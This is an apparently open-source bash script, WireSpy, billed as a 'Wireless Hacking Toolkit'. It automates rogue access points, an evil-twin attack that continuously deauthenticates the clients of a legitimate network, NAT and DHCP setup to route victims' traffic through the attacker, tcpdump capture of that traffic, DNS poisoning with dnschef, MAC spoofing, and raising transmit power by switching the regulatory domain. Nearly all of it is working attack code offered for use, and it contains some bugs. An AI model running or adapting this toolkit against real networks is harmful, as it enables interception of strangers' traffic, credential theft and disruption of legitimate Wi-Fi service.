#!/bin/bash
#    Copyright (C) 2015 Alexandre Teyar

# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at

# http://www.apache.org/licenses/LICENSE-2.0

# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
#    limitations under the License.


BOLD="\\e[1m"
NORMAL="\\e[0m"

AQUA="\\e[36m" 
LIGHTBLUE="\\e[94m"
LIGHTGREEN="\\e[92m"
LIGHTRED="\\e[91m"
LIGHTYELLOW="\\e[93m"

INFO=$LIGHTYELLOW
INTERFACE=$LIGHTGREEN
WARNING=$LIGHTRED

is_AP="false"
is_DHCP="false"
is_DNS="false"
is_sniffing="false"

attack_type="null"

IFACE="null"
WIFACE="null"
MIFACE="null"
TIFACE="null"
WCHAN="null"

check="fail"

trap quit INT


function banner() {
    echo -e "${LIGHTRED}
     ##:::::'##:'####:'########::'########::'######::'########::'##:::'##:
     ##:'##: ##:. ##:: ##.... ##: ##.....::'##... ##: ##.... ##:. ##:'##::
     ##: ##: ##:: ##:: ##:::: ##: ##::::::: ##:::..:: ##:::: ##::. ####:::
     ##: ##: ##:: ##:: ########:: ######:::. ######:: ########::::. ##::::
     ##: ##: ##:: ##:: ##.. ##::: ##...:::::..... ##: ##.....:::::: ##::::
     ##: ##: ##:: ##:: ##::. ##:: ##:::::::'##::: ##: ##::::::::::: ##::::
    . ###. ###::'####: ##:::. ##: ########:. ######:: ##::::::::::: ##::::
    :...::...:::....::..:::::..::........:::......:::..::::::::::::..:::::"
}


function copyright() {
    echo -e "${LIGHTBLUE}
    [---]        Wireless Hacking Toolkit (${LIGHTYELLOW}WireSpy${LIGHTBLUE})       [---]
    [---]          Author: ${LIGHTRED}Alexandre Teyar${LIGHTBLUE} (${LIGHTYELLOW}Ares${LIGHTBLUE})         [---]
    [---]                   Version: ${LIGHTRED}0.3${LIGHTBLUE}                  [---]
    [---]            GitHub: ${AQUA}github.com/AresS31${LIGHTBLUE}           [---]
    [---]    LinkedIn: ${AQUA}linkedin.com/in/alexandre-teyar${LIGHTBLUE}    [---]
    "
}


function main_menu() {
    banner
    copyright

    echo -e "${NORMAL}Select an option from the menu below:

    1)  Rogue access point attack
    2)  Evil-twin attack
    3)  Display/hide DHCP leases
    4)  Start/stop network sniffing
    5)  Start/stop DNS poisonning (still in developpement)
    6)  Boost wireless card power
    99) Exit WireSpy 
    Press 'CTRL+C' at anytime to exit${AQUA}
    "
    read -p "wirespy> " choice

    if [[ $choice = 1 ]]; then
        clean_up > /dev/null
        set_interface_up
        rogue_AP_menu
        set_rogue_AP_up
        is_AP="true"
        reset
        main_menu

    elif [[ $choice = 2 ]]; then
        clean_up > /dev/null
        set_interface_up
        eviltwin_menu
        set_eviltwin_up
        is_AP="true"
        reset
        main_menu

    elif [[ $choice = 3 ]]; then
        if [[ $is_AP = "false" ]]; then
            echo -e "${WARNING}You first need to set up an access point"
            sleep 4
            main_menu
        else
            if [[ $is_DHCP = "false" ]]; then
                display_DHCP_leases
                reset
                main_menu
            else
                hide_DHCP_leases
                reset
                main_menu
            fi
        fi

    elif [[ $choice = 4 ]]; then
        if [[ $is_AP = "false" ]]; then
            echo -e "${WARNING}You need first to set up an access point"
            sleep 4
            main_menu
        else
            if [[ $is_sniffing = "false" ]]; then
                start_sniffing
                reset
                main_menu
            else
                stop_sniffing
                reset
                main_menu
            fi
        fi

    elif [[ $choice = 5 ]]; then
        if [[ $is_AP = "false" ]]; then
            echo -e "${WARNING}You need first to set up an access point"
            sleep 4
            main_menu
        else
            if [[ $is_DNS = "false" ]]; then
                start_DNS_poisonning
                reset
                main_menu
            else
                stop_DNS_poisonning
                reset
                main_menu
            fi
        fi

    elif [[ $choice = 6 ]]; then
        boost_interface
        reset
        main_menu

    elif [[ $choice = 99 ]]; then
        quit

    else
        reset
        main_menu
    fi
}


function set_interface_up() {
    show_intf

    while [[ $check = "fail" ]]; do
        echo -e "${NORMAL}WAN-facing interface?${AQUA}"
        read -p "wirespy> " IFACE
         
        check_interface "$IFACE"
    done
    check="fail"

    while [[ $check = "fail" ]]; do
        echo -e "${NORMAL}Do you want to randomise ${BOLD}$IFACE ${NORMAL}MAC address(can cause troubles)? (y/n)${AQUA}"
        read -p "wirespy> " choice

        if [[ $choice = "y" ]]; then
            echo -e "${INFO}[*] Macchanging $IFACE..."
            ip link set "$IFACE" down && macchanger -A "$IFACE" && ip link set "$IFACE" up
            echo -e "${WARNING}If having problems, RESTART networking(/etc/init.d/network restart), or use wicd(wicd-client)"
            check="success"
        elif [[ $choice = "n" ]]; then
            check="success"
        else
            echo -e "${WARNING}Type by yes(y) or no(n)"
        fi
    done
    check="fail"

    # prevent wlan adapter soft blocking
    rfkill unblock wifi
    show_w_intf

    while [[ $check = "fail" ]]; do
        echo -e "${NORMAL}Wireless interface to use?${AQUA}"
        read -p "wirespy> " WIFACE

        check_interface "$WIFACE"

        if [[ $WIFACE = "$IFACE" ]]; then
            echo -e "${WARNING}$IFACE is already in use, stupid. Try another inteface..."
            check="fail"
        fi
    done
    check="fail"

    # put the wireless interface in "monitor" mode
    echo -e "${INFO}[*] Starting monitor mode on ${BOLD}$WIFACE${NORMAL}${INFO}..."
    ip link set "$WIFACE" down && iw dev "$WIFACE" set type monitor && ip link set "$WIFACE" up
    MIFACE=${WIFACE}
    # crucial, to let WIFACE come up before macchanging
    sleep 2

    check_interface "$MIFACE"
    if [[ $check = "fail" ]]; then
        set_interface_up
    fi
    check="fail"

    while [[ $check = "fail" ]]; do
        echo -e "${NORMAL}Do you want to randomise ${BOLD}$MIFACE ${NORMAL}MAC address(recommanded)? (y/n)${AQUA}"
        read -p "wirespy> " choice

        if [[ $choice = "y" ]]; then
            echo -e "${INFO}[*] Macchanging $MIFACE..."
            ip link set "$MIFACE" down && macchanger -A "$MIFACE" && ip link set "$MIFACE" up
            check="success"
        elif [[ $choice = "n" ]]; then
            check="success"
        else
            echo -e "${WARNING}Type by yes(y) or no(n)"
        fi
    done
    check="fail"
}


function rogue_AP_menu() {
echo -e "${NORMAL}
The ${BOLD}Blackhole ${NORMAL}access point type will respond to all probe requests (the access point may receive a lot of requests in crowded places - high charge).

The ${BOLD}Bullzeye ${NORMAL}access point type will respond only to the probe requests specifying the access point ESSID.

    1) Blackhole
    2) Bullzeye
${AQUA}"

    while [[ $check = "fail" ]]; do
        read -p "wirespy> " attack_type

        case $attack_type in
            [1-2])
                check="success";;
            *) 
                echo -e "${WARNING}Type ${BOLD}Blackhole(1)${NORMAL}${WARNING} or ${BOLD}Bullzeye(2)${NORMAL}${WARNING}${AQUA}"
                check="fail";;
        esac
    done
    check="fail"
}


function eviltwin_menu() {
    echo -e "${NORMAL}
This attack consists in creating an evil copy of an access point and keep sending deauth packets to its clients to force them to connect to our evil copy.
Consequently, choose the same ESSID and wireless channel than the targeted access point.

To properly perform this attack the attacker should first check out all the in-range access point copy the BSSID, the ESSID and the channel of the target then create its twin
and finally deauthentificate all the clients from the righfully access point network so they may connect to ours. 
${AQUA}"
}


function set_rogue_AP_up() {    
    echo -e "${NORMAL}Access point ESSID?${AQUA}"
    read -p "wirespy> " ESSID

    while [[ $check = "fail" ]]; do
        echo -e "${NORMAL}Wireless channel to use(1-12)?${AQUA}"
        read -p "wirespy> " WCHAN

        case $WCHAN in 
            [1-9]|1[0-2])
                check="success";;
            *) 
                echo -e "${WARNING}${BOLD}$WCHAN ${NORMAL}${WARNING}is not a valid wireless channel"
                check="fail";;
        esac
    done
    check="fail"

    while [[ $check = "fail" ]]; do
        echo -e "${NORMAL}Access point WEP authentication?(y/n)${AQUA}"
        read -p "wirespy> " choice

        if [[ $attack_type = 1 ]]; then
            if [[ $choice = "y" ]]; then
                echo -e "${NORMAL}Enter a valid WEP password(10 hexadecimal characters):${AQUA}"
                read -p "wirespy> " WEP 
                
                xterm -fg green -title "Blackhole - $ESSID" -e "airbase-ng -w $WEP -c $WCHAN -e $ESSID -P $MIFACE | tee ./conf/tmp.txt 2> /dev/null" &
                check="success"
            elif [[ $choice = "n" ]]; then
                xterm -fg green -title "Blackhole - $ESSID" -e "airbase-ng -c $WCHAN -e $ESSID -P $MIFACE | tee ./conf/tmp.txt 2> /dev/null" &
                check="success"
            else
                echo -e "${WARNING}Reply with yes (y) or no (n)"
                check="fail"
            fi

        elif [[ $attack_type = 2 ]]; then
            if [[ $choice = "y" ]]; then
                echo -e "${NORMAL}Enter a valid WEP password(10 hexadecimal characters)${AQUA}"
                 read -p "wirespy> " WEP 

                xterm -fg green -title "Bullzeye - $ESSID" -e "airbase-ng -w $WEP -c $WCHAN -e $ESSID $MIFACE | tee ./conf/tmp.txt 2> /dev/null" &
                check="success"
            elif [[ $choice = "n" ]]; then
                xterm -fg green -title "Bullzeye - $ESSID" -e "airbase-ng -c $WCHAN -e $ESSID $MIFACE | tee ./conf/tmp.txt 2> /dev/null" &
                check="success"
            else
                echo -e "${WARNING}Reply with yes (y) or no (n)"
                check="fail"
            fi
        fi
    done
    check="fail"

    # crucial, to let TIFACE come up before setting it up
    sleep 2                  
    # storing the terminal pid
    xterm_AP_PID=$(pgrep --newest Eterm)

    # extracting the tap interface
    TIFACE=$(grep "Created tap interface" ./conf/tmp.txt | awk '{print $5}')

    check_interface "$TIFACE"
    if [[ $check = "fail" ]]; then
        echo -e "${WARNING}An airbase-ng error occured(could not create the tap interface)"
        echo -e "${WARNING}Exiting..."
        sleep 4
        quit
    fi

    set_up_iptables
    set_up_DHCP_srv
    
    echo -e "${INFO}[*] ${BOLD}$ESSID ${NORMAL}${INFO}is now running..."
    echo -e "${INFO}[*] Hacking time has begun..."
    sleep 6
}


function set_eviltwin_up() {
    echo -e "${NORMAL}Evil twin ESSID?${AQUA}"
    read -p "wirespy> " eviltwin_ESSID

    echo -e "${NORMAL}Evil twin BSSID?${AQUA}"
    read -p "wirespy> " eviltwin_BSSID

    while [[ $check = "fail" ]]; do
        echo -e "${NORMAL}Wireless channel to use(1-12)?(use the good twin wireless channel)${AQUA}"
         read -p "wirespy> " WCHAN

        case $WCHAN in
            [1-9]|1[0-2])
                check="success";;
            *) 
                echo -e "${WARNING}${BOLD}$WCHAN ${NORMAL}${WARNING}is not a valid wireless channel"
                check="fail";;
        esac
    done
    check="fail"
    echo "$MIFACE"
    xterm -fg green -title "Evil Twin - $eviltwin_ESSID" -e "airbase-ng -c $WCHAN -e $eviltwin_ESSID -P $MIFACE | tee ./conf/tmp.txt 2> /dev/null" &

    sleep 4                                 # crucial, to let TIFACE come up before setting it up
    xterm_AP_PID=$(pgrep --newest Eterm)    # storing the terminal pid 

    # extracting the tap interface
    TIFACE=$(grep "Created tap interface" /conf/tmp.txt | awk '{print $5}')

    check_interface "$TIFACE"
    if [[ $check = "fail" ]]; then
        echo -e "${WARNING}An airbase-ng error occured(could not create the tap interface)"
        echo -e "${WARNING}Exiting..."
        sleep 4
        quit
    fi

    # de-auth the legit connected users
    xterm -fg green -title "aireplay-ng - $eviltwin_ESSID" -e "aireplay-ng --ignore-negative-one --deauth 0 -a $eviltwin_BSSID $MIFACE" &
    xterm_aireplay_deauth=$(pgrep --newest xterm)

    set_up_iptables
    set_up_DHCP_srv
    
    echo -e "${INFO}[*] ${BOLD}$eviltwin_ESSID ${NORMAL}${INFO}is now running..."
    echo -e "${INFO}[*] Hacking time has begun..."
    sleep 6
}


function set_up_iptables() {
    # cleaning the mess
    iptables --flush
    iptables --table nat --flush
    iptables --delete-chain
    iptables --table nat --delete-chain

    # iptables rules
    iptables -P FORWARD ACCEPT
    # forward the traffic via the internet facing interface
    iptables -t nat -A POSTROUTING -o "$IFACE" -j MASQUERADE
}


function set_up_DHCP_srv() {
    # enable ip forwarding
    echo "1" > /proc/sys/net/ipv4/ip_forward

    # setting up ip, route and stuff
    ip link set "$TIFACE" up    
    # a bit of clean-up is always good!
    ip addr flush dev "$TIFACE"
    ip addr add 10.0.0.254/24 dev "$TIFACE"
    
    # a bit of clean-up is always good!
    ip route flush dev "$TIFACE"
    ip route add 10.0.0.0/24 via 10.0.0.254 dev "$TIFACE"

    # Reset any pre-existing dhcp leases
    cat /dev/null > /var/lib/dhcp/dhcpd.leases
    cat /dev/null > /tmp.txt/dhcpd.conf

    # Copy the conf file for the DHCP serv and change the isc-dhcp-server settings
    cp ./conf/dhcpd.conf /etc/dhcp/dhcpd.conf 
    sed -e s/INTERFACES=.*/INTERFACES=\"$TIFACE\"/ -i.bak /etc/default/isc-dhcp-server

    # Starting the DHCP service
    dhcpd -cf /etc/dhcp/dhcpd.conf "$TIFACE" &> /dev/null
    /etc/init.d/isc-dhcp-server restart &> /dev/null
}


function show_intf() {
    echo -e "${INTERFACE}Available networking interfaces:"
    for intf in $(ip -o link show | awk -F': ' '{print $2}'); do # get the network interfaces names
        case ${intf} in
            lo)
                continue;;
            *)
                MAC=$(ip link show "$intf" | awk '/ether/ {print $2}')
                echo -e "${intf}:\\t $MAC";;
        esac
    done
}


function show_w_intf() {
    echo -e "${INTERFACE}Available wireless interfaces:"
    for intf in $(ip -o link show | awk -F': ' '{print $2}' | grep "wlan"); do # get the interfaces names
        MAC=$(ip link show "$intf" | awk '/ether/ {print $2}')
        echo -e "${intf}:\\t $MAC"
    done
}


function check_interface()  {
    if [[ $(ip link show "$1" 2> /dev/null) ]]; then
        check="success"
    else
        echo -e "${WARNING}Network interface ${BOLD}${1}${NORMAL} ${WARNING}does NOT exist"
        check="fail"
    fi
}  


function start_sniffing() {
    xterm -fg green -title "TCPDump" -e "tcpdump -w ./logs/dump-$(date +%F::%T).pcap -v -i $TIFACE" &
    is_sniffing="true"
}


function stop_sniffing() {
    pkill tcpdump
    is_sniffing="false"
}


function start_DNS_poisonning() {
    xterm -fg green -title "DNSChef" -e "dnschef -i $TIFACE -f ./conf/hosts" &
    xterm_sniff_PID=$(pgrep --newest xterm)
    is_DNS="true"
}


function stop_DNS_poisonning() {
    pkill dnsspoof
    is_DNS="false"
}


function display_DHCP_leases() {
    xterm -fg green -title "DHCP Server" -e "tail -f /var/lib/dhcp/dhcpd.leases 2> /dev/null" &
    xterm_DHCP_PID=$(pgrep --newest xterm)
    is_DHCP="true"
}


function hide_DHCP_leases() {
    pkill "$xterm_DHCP_PID" &> /dev/null
    is_DHCP="false"
}


function boost_interface() {
    show_w_intf

    while [[ $check = "fail" ]]; do
        echo -e "${NORMAL}Which wireless interface do you want to boost?${AQUA}"
        read -p "wirespy> " super_WIFACE

        check_interface "$super_WIFACE"
    done
    check="fail"

    ip link set "$super_WIFACE" down && iw reg set BO && ip link set "$super_WIFACE up" 

    echo -e "${NORMAL}How much do you want to boost the power of $super_WIFACE(up to 30dBm)?${AQUA}"
    read -p "wirespy> " boost

    echo -e "${INFO}[*] $super_WIFACE powering up"
    iw dev "$super_WIFACE" set txpower fixed "$boost"mBm
    sleep 4
}


function clean_up() {
    echo -e "${INFO}[*] Killing running processes..."
    if [[ $is_DHCP = "true" ]]; then
		hide_DHCP_leases
	elif [[ $is_DNS = "true" ]]; then
		stop_DNS_poisonning
	elif [[ $is_sniffing = "true" ]]; then
		stop_sniffing
	fi

    killall airbase-ng airplay-ng &> /dev/null
    /etc/init.d/isc-dhcp-server stop &> /dev/null
    
    echo -e "${INFO}[*] Removing temporary files..."
    rm -f ./conf/tmp.txt

    check_interface "$MIFACE" &> /dev/null
    if [[ $check = "success" ]]; then
        echo -e "${INFO}[*] Starting managed mode on ${BOLD}$MIFACE${NORMAL}${INFO}..." 
        ip link set "$MIFACE" down && iw dev "$MIFACE" set type managed && ip link set "$MIFACE up"
        sleep 2
    fi
    check="fail"
}


function quit() {
    clean_up
    exit
}


# check that the script is run with root privileges
if [[ $EUID -ne 0 ]]; then
    echo -e "${WARNING}This script must be run as root"
    exit 1
fi

main_menu
